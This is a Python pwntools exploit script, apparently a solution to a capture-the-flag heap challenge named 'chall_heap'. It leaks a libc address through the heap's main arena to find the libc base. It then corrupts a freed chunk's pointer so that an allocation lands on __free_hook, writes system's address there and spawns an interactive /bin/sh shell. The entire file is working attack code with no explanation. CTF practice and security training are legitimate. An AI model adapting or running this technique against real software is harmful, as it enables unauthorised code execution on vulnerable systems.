#!/usr/bin/env python3
from pwn import *

bin_file = './chall_heap'
context(os = 'linux', arch = 'amd64')
# context(terminal = ['tmux', 'splitw', '-v'])
# context.log_level = 'debug'

binf = ELF(bin_file)

libc = binf.libc
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10

def attack(conn, **kwargs):
    conn.sendlineafter('size', str(0x418))
    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('size', str(0x18))

    conn.sendlineafter('index >> ', '0')
    conn.recvuntil('content : ')
    addr_libc_mainarena = unpack(conn.recv(6), 'all') - 0x60
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base = 0x{:08x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_system    = libc.functions['system'].address

    conn.sendlineafter('index >> ', '2')
    conn.sendline(pack(addr_libc_free_hook))

    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('content >> ', '/bin/sh\x00')
    conn.sendlineafter('size', str(0x18))
    conn.sendlineafter('content >> ', pack(addr_libc_system))

def main():
    # conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
